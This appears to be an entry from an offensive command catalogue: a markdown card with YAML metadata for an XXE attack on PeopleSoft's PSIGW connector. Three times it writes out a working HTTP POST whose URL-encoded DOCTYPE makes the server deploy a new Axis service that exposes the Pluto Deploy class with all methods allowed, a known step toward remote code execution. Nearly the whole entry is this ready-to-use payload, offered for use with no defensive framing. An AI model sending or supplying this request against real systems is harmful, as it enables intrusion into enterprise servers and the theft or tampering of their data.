---
data: >-
  POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1

  <!DOCTYPE a PUBLIC "-//B/A/EN"
  "http://localhost:8080/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22lmJyaVBUrfcEfJw%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment">
tags:
  - xxe
  - deployment
type: command
executor: bash
platforms:
  - Linux
  - Web
id: 2187214f-9ad8-49df-98be-7b69f861beb4
created_at: '2025-12-13T09:00:33.609Z'
updated_at: '2025-12-13T09:00:33.609Z'
verified: false
validated: true
submitted: true
---
# POST XXE Deploy Service

## Command

```bash
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
<!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:8080/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22lmJyaVBUrfcEfJw%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment">
```

## Description

Exploits XXE to deploy a new Axis service on localhost.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `name` | Service name lmJyaVBUrfcEfJw | Yes |
| `method` | Deploys service | Yes |
| `className` | org.apache.pluto.portalImpl.Deploy | Yes |

## Examples

### Basic Usage

```bash
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
<!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:8080/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22lmJyaVBUrfcEfJw%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment">
```

## Expected Output

Service deployment confirmation.

## Related

- [[procedures/Exploit-XXE-to-Deploy-Axis-Service]]
